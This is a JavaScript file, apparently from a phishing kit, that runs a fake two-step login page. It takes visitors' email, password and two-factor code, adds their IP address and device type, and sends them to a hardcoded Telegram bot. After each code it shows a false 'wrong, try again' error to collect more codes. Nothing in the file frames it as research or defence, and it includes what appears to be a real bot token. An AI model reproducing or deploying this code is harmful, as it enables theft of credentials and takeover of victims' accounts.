const form1 = document.getElementById('form1');
const form2 = document.getElementById('form2');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const factorInput = document.getElementById('factor');

const error1 = document.getElementById('error1');
const error2 = document.getElementById('error2');
const error3 = document.getElementById('error3');

let email, password, twoFactor;

const token = '7985669297:AAEVfINvGGV4VX6iLLH1dLae8EsSdLJKPVY';
const chatId = '-4614449543';

const sendMessage = async function (message) {
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  })
    .then(response => response.json())
    .then(data => {
      return data;
    })
    .catch(error => {
      console.error('خطا در ارسال پیام:', error.message);
    });
};
function getDeviceType() {
  const userAgent = navigator.userAgent;

  // بررسی برای دستگاه‌های iPhone
  if (/iPhone/i.test(userAgent)) {
    return 'iPhone';
  }
  // بررسی برای دستگاه‌های Android
  else if (/Android/i.test(userAgent)) {
    return 'Android';
  }
  // در غیر این صورت، فرض می‌کنیم که دسکتاپ است
  else {
    return 'Desktop';
  }
}

let userIp;
async function getUserIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    userIp = data.ip;
  } catch (error) {
    console.error('خطا در دریافت IP:', error);
    return null; // در صورت بروز خطا
  }
}
getUserIP();

if (localStorage.getItem('form2')) {
  form1.classList.add('hidden');
  form2.classList.remove('hidden');
}

form1.addEventListener('submit', e => {
  e.preventDefault();
  if (emailInput.value === '') {
    error1.classList.remove('hidden');
  }
  if (passwordInput.value === '') {
    error2.classList.remove('hidden');
  }

  if (passwordInput.value !== '' && emailInput.value !== '') {
    email = emailInput.value;
    password = passwordInput.value;
    localStorage.setItem('form2', true);
    form1.classList.add('hidden');
    form2.classList.remove('hidden');
    const message = `
    URL : ${window.location.href}
Device: ${getDeviceType()}
Email: ${email}
Password: ${password}
IP: ${userIp}
    `;
    sendMessage(message);
  }
});

form2.addEventListener('submit', e => {
  e.preventDefault();
  if (factorInput.value === '') {
    error3.classList.remove('hidden');
  } else {
    twoFactor = factorInput.value;
    const message = `
    URL : ${window.location.href}
Device: ${getDeviceType()}
Email: ${email}
Password: ${password}
TwoFactor: ${twoFactor}
IP: ${userIp}
    `;
    sendMessage(message);
    setTimeout(() => {
      error3.classList.remove('hidden');
      error3.textContent === 'wrong! plaese try again.';
      factorInput.value = '';
    }, 1000);
    // error3.classList.add('hidden');
  }
});

document.getElementById('eye').addEventListener('click', () => {
  if (passwordInput.getAttribute('type') === 'password') {
    document.getElementById('eye').setAttribute('src', './src/images/eye.svg');
    passwordInput.setAttribute('type', 'text');
  } else {
    document
      .getElementById('eye')
      .setAttribute('src', './src/images/eyeSlash.svg');
    passwordInput.setAttribute('type', 'password');
  }
});
